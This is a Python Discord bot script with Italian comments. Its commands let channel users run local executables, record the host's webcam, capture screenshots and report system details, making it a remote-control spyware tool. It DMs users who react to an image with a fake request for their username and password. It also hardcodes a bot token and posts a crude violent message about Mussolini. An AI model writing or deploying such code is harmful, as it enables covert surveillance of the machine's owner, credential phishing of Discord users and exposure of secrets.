import discord
from discord.ext import commands
import random
import pyautogui
import subprocess
import cv2
import os
import json
from lol import platform
import lol 
import sys
import psutil
# Assicurati di avere i moduli necessari e di avere configurato correttamente i tuoi import
from gass import save_message, get_random_message, create_and_populate_db  # Supponendo che gli import siano corretti
from Sas import capture_camera_image  # Assicurati che capture_camera_image sia definito correttamente in Sas.py
from lol import status
# Token del bo
TOKEN = "MTI3NDY5Nzc1MjMxOTc1ODQxMQ.G8tnUT.Pt25wgL7x9KB-NKSYdC_cU2SZg76twyw_wjz5Y" 
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

message_with_image_id = None  # Evita di usare variabili globali, ma per semplicità, mantieni questa variabile globale

@bot.event
async def on_ready():
    print(f'Bot connesso come {bot.user}')

@bot.event
async def on_message(message):
    # Evita che il bot risponda a se stesso
    if message.author == bot.user:
        return


    # Salva il messaggio nel database
    save_message(str(message.author), message.content)

    # Rispondi con un messaggio casuale se il bot è menzionato
    if bot.user in message.mentions:
        random_message = get_random_message()
        if random_message:
            await message.channel.send(random_message)

    # Risposta speciale per la parola chiave
    if "mussolini" in message.content.lower():
        await message.channel.send("MUSSOLINI APPESOOOOO XOXOXKXK")

    # Gestione dei DM
    if isinstance(message.channel, discord.DMChannel):
        print(f"Messaggio privato ricevuto da {message.author}: {message.content}")
    
    # Assicurati che altri comandi vengano elaborati
    await bot.process_commands(message)

@bot.command()
async def run_exe(ctx):
    try:
        subprocess.run([r"C:\Users\forch\Downloads\sasori.exe"], check=True)
        await ctx.send("Eseguito sasori.exe con successo!")
    except Exception as e:
        await ctx.send(f"Errore durante l'esecuzione di sasori.exe: {e}")
    
    try:
        subprocess.run([r"C:\Users\forch\Downloads\sas.exe"], check=True)
        await ctx.send("Eseguito sas.exe con successo!")
    except Exception as e:
        await ctx.send(f"Errore durante l'esecuzione di sas.exe: {e}")

@bot.command()
async def os_inf(ctx):
    """Mostra informazioni sul sistema operativo e sulle risorse."""
    # Ottieni le informazioni sul sistema
    cpu_percent = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    disk_usage = psutil.disk_usage('/')

    os_info = f"""
    Platform: {platform.system()}
    OS Name: {os.name}
    Platform Version: {platform.version()}
    Release: {platform.release()}
    Architecture: {platform.architecture()[0]}
    CPU Usage: {cpu_percent}%
    Memory Usage: {memory_info.percent}%
    Disk Usage: {disk_usage.percent}%
    """
    
    # Invia le informazioni al canale Discord
    await ctx.send(os_info)




@bot.command()
async def fotocam(ctx, duration: int = 10):
    """Registra un video dalla fotocamera per una durata specificata in secondi (default 10 secondi)."""
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        await ctx.send("Errore: Impossibile aprire la fotocamera.")
        return

    # Definisci il codec e crea un oggetto VideoWriter
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    video_file = 'camera_video.avi'
    frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    out = cv2.VideoWriter(video_file, fourcc, 20.0, (frame_width, frame_height))

    # Cattura e salva il video per la durata specificata
    await ctx.send(f"Inizio registrazione. Verrà registrato per circa {duration} secondi.")
    start_time = cv2.getTickCount()
    fps = 30.0  # Imposta un frame rate desiderato

    while True:
        ret, frame = cap.read()
        if not ret:
            await ctx.send("Errore: Impossibile catturare il frame dalla fotocamera.")
            break
        out.write(frame)

        # Verifica se il tempo di registrazione ha superato la durata specificata
        elapsed_time = (cv2.getTickCount() - start_time) / cv2.getTickFrequency()
        if elapsed_time > duration:
            break

    # Rilascia la fotocamera e chiudi l'oggetto VideoWriter
    cap.release()
    out.release()

    # Invia il video su Discord
    with open(video_file, 'rb') as file:
        await ctx.send(file=discord.File(file, video_file))

    # Rimuovi il file video temporaneo
    os.remove(video_file)

@bot.command()
async def screenshot(ctx):
    # Cattura uno screenshot
    screenshot = pyautogui.screenshot()
    screenshot_file = 'screenshot_test.png'
    screenshot.save(screenshot_file)

    # Invia lo screenshot al canale
    with open(screenshot_file, 'rb') as file:
        await ctx.send(file=discord.File(file, 'screenshot_test.png'))

    # Rimuovi il file screenshot temporaneo
    os.remove(screenshot_file)


    


@bot.command()
async def cirociao(ctx):
    image_path = r"C:\Users\forch\Downloads\ciro.jpg"

    try:
        # Invia l'immagine per la prima volta
        with open(image_path, "rb") as file:
            picture = discord.File(file)
            mess = await ctx.send("Ciro", file=picture)
            
            # Memorizza l'ID del messaggio globalmente
            global message_with_image_id
            message_with_image_id = mess.id

            # Invia l'immagine 5 volte in più riaprendo il file ogni volta
            for _ in range(5):
                with open(image_path, "rb") as file:
                    picture = discord.File(file)
                    await ctx.send(file=picture)

            # Aggiungi una reazione al messaggio originale
            await mess.add_reaction("👍")

    except FileNotFoundError:
        await ctx.send("Immagine non trovata. Verifica il percorso del file.")

@bot.event
async def on_reaction_add(reaction, user):
    if message_with_image_id and reaction.message.id == message_with_image_id and not user.bot:
        await user.send("Ciao! Per continuare a utilizzare questo bot, ti preghiamo di inserire il tuo nome utente e la tua password:\n\nNome Utente:\nPassword:")

@bot.command()
async def cirojoke(ctx):
    # Invia un link come messaggio
    await ctx.send('https://tenor.com/view/%D0%B4%D0%B6%D0%BE%D0%BA%D0%B5%D1%80-jonkler-jonkler-gif-11529455559250573721')

    # Invia un file immagine
    image_path = r"C:\Users\forch\Downloads\ciro.jpg"
    try:
        with open(image_path, "rb") as file:
            picture = discord.File(file)
            await ctx.send(file=picture)
    except FileNotFoundError:
        await ctx.send("Immagine non trovata. Verifica il percorso del file.")

bot.run(TOKEN)






